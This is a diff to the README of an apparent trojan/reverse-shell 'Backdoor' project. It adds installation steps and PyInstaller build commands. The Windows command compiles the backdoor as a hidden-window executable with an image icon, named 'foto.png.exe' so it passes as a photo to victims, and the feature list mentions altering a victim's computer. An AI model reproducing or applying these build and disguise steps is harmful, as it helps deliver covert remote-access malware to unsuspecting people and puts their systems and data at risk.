@@ -36,6 +36,32 @@ Backdoor is a computer virus popular known as trojan horse. It work's as a rever
 - [ ] Change victim's computer background.
 - [ ] Backdoor complete (Only when all features ready).
 
+
+# Instalation
+
+
+you need to install all the dependecies to run the backdoor and server.
+
+
+linux:
+
+    ~$ sudo pip install -r requeriments.txt
+windows:
+
+    pip install -r requeriments.txt
+    
+
+# Compiling
+
+linux:
+
+    pyinstaller -F --clean -w backdoor.py -n backdoor
+
+
+windows:
+
+    pyinstaller -F --clean -w backdoor.py -i icone.png -n foto.png.exe
+
 =============================================================================================== 
 
 
